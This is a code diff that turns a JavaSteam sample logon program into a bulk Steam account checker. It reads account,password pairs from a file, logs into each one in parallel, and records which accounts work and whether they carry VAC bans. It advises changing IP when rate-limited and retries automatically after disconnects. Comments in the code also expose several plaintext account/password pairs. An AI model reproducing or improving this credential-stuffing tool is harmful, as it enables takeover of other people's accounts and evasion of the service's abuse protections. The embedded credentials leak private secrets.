@@ -1,6 +1,7 @@
 package in.dragonbra.javasteamsamples;
 
 import in.dragonbra.javasteam.enums.EResult;
+import in.dragonbra.javasteam.steam.handlers.steamapps.callback.VACStatusCallback;
 import in.dragonbra.javasteam.steam.handlers.steamuser.LogOnDetails;
 import in.dragonbra.javasteam.steam.handlers.steamuser.SteamUser;
 import in.dragonbra.javasteam.steam.handlers.steamuser.callback.LoggedOffCallback;
@@ -11,6 +12,8 @@ import in.dragonbra.javasteam.steam.steamclient.callbacks.ConnectedCallback;
 import in.dragonbra.javasteam.steam.steamclient.callbacks.DisconnectedCallback;
 import in.dragonbra.javasteam.util.log.DefaultLogListener;
 import in.dragonbra.javasteam.util.log.LogManager;
+
+import java.io.*;
 
 /**
  * @author lngtr
@@ -36,15 +39,48 @@ public class SampleLogon implements Runnable {
         this.pass = pass;
     }
 
-    public static void main(String[] args) {
-        if (args.length < 2) {
-            System.out.println("Sample1: No username and password specified!");
-            return;
-        }
-
+    public static void main(String[] args) throws Exception {
         LogManager.addListener(new DefaultLogListener());
+//        nonoyoyo723/loubing3717172
+//        new SampleLogon("zztest2", "12345678_zz").run();
 
-        new SampleLogon(args[0], args[1]).run();
+        File pwdFile=new File("D:\\test\\pwd.txt");
+
+        InputStreamReader inputReader = new InputStreamReader(new FileInputStream(pwdFile));
+        BufferedReader bf = new BufferedReader(inputReader);
+        String str;
+        while ((str = bf.readLine()) != null) {
+            String[] split = str.split(",");
+
+            String acc=split[0];
+            String pwd=split[1];
+
+            ThreadPoolUtil.async(new SampleLogon(acc, pwd));
+//            Thread.sleep(1500L);
+        }
+        bf.close();
+        inputReader.close();
+
+//        ThreadPoolUtil.async(new SampleLogon("rlj65784", "rfv65875@"));
+//        ThreadPoolUtil.async(new SampleLogon("parmlf3017", "gf2A3L8Ye2Jl"));
+    }
+
+    private static FileWriter FW_RES_PWD;
+    static {
+        try {
+            FW_RES_PWD = new FileWriter("D:\\test\\pwd_res.txt");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+    private synchronized static void writeResPwd(String str){
+        try {
+            FW_RES_PWD.write(str);
+            FW_RES_PWD.write("\n");
+            FW_RES_PWD.flush();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 
     @Override
@@ -68,6 +104,8 @@ public class SampleLogon implements Runnable {
         manager.subscribe(LoggedOnCallback.class, this::onLoggedOn);
         manager.subscribe(LoggedOffCallback.class, this::onLoggedOff);
 
+        manager.subscribe(VACStatusCallback.class,this::onVACStatus);
+
         isRunning = true;
 
         System.out.println("Connecting to steam...");
@@ -80,6 +118,21 @@ public class SampleLogon implements Runnable {
             // in order for the callbacks to get routed, they need to be handled by the manager
             manager.runWaitCallbacks(1000L);
         }
+
+        System.out.println(user+",run finshed");
+//        steamClient.disconnect();
+        steamUser.logOff();
+    }
+
+    private void onVACStatus(VACStatusCallback callback){
+        if (callback.getBannedApps().size()>0) {
+            System.err.println(user+" has VAC: "+callback.getBannedApps());
+            writeResPwd(user+",vac,"+callback.getBannedApps());
+        }else{
+            System.err.println(user+" has`t VAC");
+            writeResPwd(user+",:)");
+        }
+        isRunning = false;
     }
 
     private void onConnected(ConnectedCallback callback) {
@@ -93,12 +146,16 @@ public class SampleLogon implements Runnable {
     }
 
     private void onDisconnected(DisconnectedCallback callback) {
-        System.out.println("Disconnected from Steam");
+        System.out.println("Disconnected from Steam,acc:"+user+", isUserInitiated:"+callback.isUserInitiated());
+
         isRunning = false;
+        //again
+        ThreadPoolUtil.async(new SampleLogon(user, pass));
     }
 
     private void onLoggedOn(LoggedOnCallback callback) {
         if (callback.getResult() != EResult.OK) {
+            writeResPwd(user+",error,"+callback.getResult().name());
             if (callback.getResult() == EResult.AccountLogonDenied) {
                 // if we recieve AccountLogonDenied or one of it's flavors (AccountLogonDeniedNoMailSent, etc)
                 // then the account we're logging into is SteamGuard protected
@@ -106,6 +163,16 @@ public class SampleLogon implements Runnable {
                 System.out.println("Unable to logon to Steam: This account is SteamGuard protected.");
                 isRunning = false;
                 return;
+            }else if (callback.getResult() == EResult.InvalidPassword) {
+
+            }else if (callback.getResult() == EResult.RateLimitExceeded) {
+                System.err.println(" WARN to change IP!!!!!!!!!!!!!!!");
+                System.err.println(" WARN to change IP");
+                System.err.println(" WARN to change IP!!!!!!!!!!!!!!!");
+            }else if (callback.getResult() == EResult.RateLimitExceeded) {
+
+            }else if (callback.getResult() == EResult.AccountLoginDeniedNeedTwoFactor) {
+
             }
 
             System.out.println("Unable to logon to Steam: " + callback.getResult());
@@ -118,7 +185,7 @@ public class SampleLogon implements Runnable {
         // at this point, we'd be able to perform actions on Steam
 
         // for this sample we'll just log off
-        steamUser.logOff();
+//        steamUser.logOff();
     }
 
     private void onLoggedOff(LoggedOffCallback callback) {
